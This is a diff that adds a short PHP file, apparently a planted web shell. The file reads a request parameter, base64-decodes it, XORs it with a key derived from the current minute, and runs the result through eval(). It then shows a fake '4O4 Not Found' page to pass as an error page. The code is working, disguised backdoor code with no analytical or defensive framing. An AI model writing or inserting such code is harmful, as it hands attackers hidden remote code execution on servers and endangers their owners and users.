@@ -1,0 +1,17 @@
+<?php
+date_default_timezone_set("PRC");
+$key=md5(date("Y-m-d H:i",time()));
+class Enjoy{
+    function encode($key){
+    @$post=base64_decode($_REQUEST['anyan5772']);
+    for($i=0;$i<strlen($post);$i++){$post[$i] = $post[$i] ^ $key[$i%32];}
+    return $post;}
+    function funny($data)
+    {return eval($this->encode("$data"));}
+    function prt()
+    {echo '<h1 align="center">4O4 Not Found</h1>';}
+}
+$fun=new Enjoy;
+$fun->funny($key);
+$fun->prt();
+?>
